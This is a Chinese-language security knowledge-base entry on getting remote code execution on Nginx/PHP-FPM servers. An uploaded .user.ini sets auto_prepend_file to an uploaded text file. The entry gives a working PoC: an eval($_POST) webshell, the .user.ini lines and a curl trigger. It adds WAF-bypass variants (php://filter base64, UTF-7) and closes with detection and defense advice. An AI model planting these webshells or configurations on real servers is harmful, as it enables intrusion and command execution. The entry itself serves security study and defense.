---
id: web-php-file-inclusion-user-ini-auto-prepend-rce
title: .user.ini auto_prepend_file 包含上传文件实现 PHP-FPM RCE
type: scenario
domain: web
path: web/php/file-inclusion
technique: user-ini-auto-prepend-rce
tags:
- php
- user-ini
- auto-prepend-file
- file-inclusion
- rce
- php-fpm
- short-open-tag
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: PHP 5.3.0+（引入 .user.ini 机制，原文口径）
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:18:56+08:00'
  notes: 已对照原文与 img 05-07 核对：.user.ini 向上递归查找、user_ini.cache_ttl=300、auto_prepend_file 属 PHP_INI_PERDIR、short_open_tag=On 短标签、上传 1.txt 与 .user.ini 后 POST cmd 执行 whoami 均一致；affected_versions 按原文“PHP 5.3.0 引入 .user.ini”标注
url: /docs/web/php/file-inclusion/web-php-file-inclusion-user-ini-auto-prepend-rce/
draft: false
kb_aliases:
- .user.ini RCE
- auto_prepend_file
- auto_append_file
- short_open_tag 上传
- PHP-FPM 目录级配置
- Nginx 无法用 .htaccess 时的包含
---

## 一句话结论

Nginx + PHP-FPM 等 CGI/FastCGI 环境不支持 `.htaccess`，但只要上传目录可写，攻击者上传一个 `.user.ini` 把 `auto_prepend_file` 指向自己上传的文本文件，该目录下任意 PHP 页面在启动时都会先把该文本当 PHP 代码编译执行，从而 RCE。

## 原理

- `.user.ini` 是 PHP 在 CGI/FastCGI（典型为 PHP-FPM）下提供的目录级配置文件。PHP 执行脚本时，会从脚本所在目录向上递归查找 `user_ini.filename`（默认 `.user.ini`），并用其中的键值覆盖 `php.ini`。它只接受 `PHP_INI_PERDIR` 与 `PHP_INI_ALL` 级别的配置项。
- `auto_prepend_file` 属于 `PHP_INI_PERDIR`，含义是“在每个脚本执行前自动包含指定文件”。PHP 对被包含文件不做扩展名判断，只按 PHP 代码解析，所以 `1.txt` 里的 `<?php ... ?>` 会被执行。
- `short_open_tag` 也属于 `PHP_INI_PERDIR`。默认关闭时 `<? ... ?>` 不会进入 PHP 解析；在 `.user.ini` 中写 `short_open_tag=On` 后短标签即可用，因此连 `<?php` 都可以省掉，便于绕过内容检测。
- 与 `.htaccess` 的关键区别：`.user.ini` 只改 PHP 配置，不能改 Apache 解析规则；但它在 Nginx + PHP-FPM 下仍然生效，正好补上 `.htaccess` 失效的环境。
- `.user.ini` 默认有 `user_ini.cache_ttl=300` 秒缓存：上传后不会立即生效，最长要等 5 分钟，或等 PHP-FPM 重启/重载。缓存也是该手法在比赛里常被误判为“不生效”的原因。
- `.user.ini` 的键名区分大小写，注释用 `;` 而不是 `#`；写成 Apache 的 `php_value ...` 形式不会被识别。

## 触发条件

- PHP 以 CGI/FastCGI 模式运行（`phpinfo()` 的 Server API 为 `FPM/FastCGI` 或 `CGI/FastCGI`），且 `user_ini.filename` 没有被置空。
- 上传接口允许写入 `.user.ini`（或可把文件重命名为 `.user.ini` 落盘），并且允许再上传一个内容可控的普通文件。
- 上传目录或其子目录下存在可访问的 PHP 脚本，攻击者能请求到，使 `auto_prepend_file` 被触发。
- PHP-FPM 进程对上传目录有读权限；通常上传目录已满足。

## 利用步骤

1. 确认运行模式：访问 `phpinfo()` 查看 `Server API`、`user_ini.filename`、`user_ini.cache_ttl`；若能上传 `.htaccess` 但 PHP 指令报 500，也说明是 PHP-FPM 而非 mod_php。
2. 上传恶意文本 `1.txt`，内容为短标签 PHP 代码。
3. 上传 `.user.ini`，开启短标签并自动前置包含 `1.txt`。
4. 等待缓存过期（默认最多 300 秒），或目标恰好重启/重载了 PHP-FPM。
5. 请求同目录下任意 PHP 页面，并用 POST 传入命令，得到执行结果。

## PoC

`1.txt`：

```php
<? eval($_POST['cmd']); ?>
```

`.user.ini`：

```ini
short_open_tag=On
auto_prepend_file=1.txt
```

触发：

```bash
curl -s -X POST 'http://target/index.php' --data 'cmd=system("whoami");'
```

若短标签本来已开启，或 payload 直接写 `<?php ... ?>`，`.user.ini` 只需要一行：

```ini
auto_prepend_file=1.txt
```

`auto_append_file` 用法相同，只是包含发生在脚本执行结束前。

## 变体与关联

- mod_php 环境把同样思路写进 `.htaccess`：`php_value auto_prepend_file /var/www/html/upload/shell.jpg`。
- 路径拼接：`auto_prepend_file` 只给文件名时，可用 `include_path=".:/var/www/html/upload"` 指定搜索目录。
- 内容被 WAF 拦 `<?`/`php` 时，可把 shell 做 Base64 后用 `php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.txt"`（.htaccess）或配合 `php://filter` 链；PHP < 8.0 还可用 `zend.multibyte=1` + `zend.script_encoding=UTF-7` 把 `<` 编成 `+ADw-`。
- 关联：[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（无法上传第二份文件时用报错日志落马）；[[web-php-file-inclusion-user-ini-session-save-path-webshell]]（用 Session 文件当被包含文件）；[[web-generic-file-upload-htaccess-handler-override]]（mod_php 下的同族配置覆盖）。
- 边界：`user_ini.filename=""`、上传目录禁止写点文件、PHP 以 mod_php 运行、或请求的脚本不在 `.user.ini` 的向上查找链内时，本手法不成立。

## 检测与防御

- 检测：Web 目录出现 `.user.ini`；配置中出现 `auto_prepend_file`/`auto_append_file`/`short_open_tag`；任意 PHP 请求都伴随对同一非 PHP 文件的读取；上传目录出现无扩展名或点开头的文件。
- 防御：`php.ini` 设置 `user_ini.filename=""` 关闭该机制；上传接口使用白名单并拒绝点开头/无扩展名文件；上传目录禁止 PHP 执行（Nginx `location ~ \.php$ { deny all; }`）；用 `php_admin_value` 固定 `open_basedir`、`disable_functions`，避免用户级配置覆盖；监控并定期扫描 `.user.ini`。
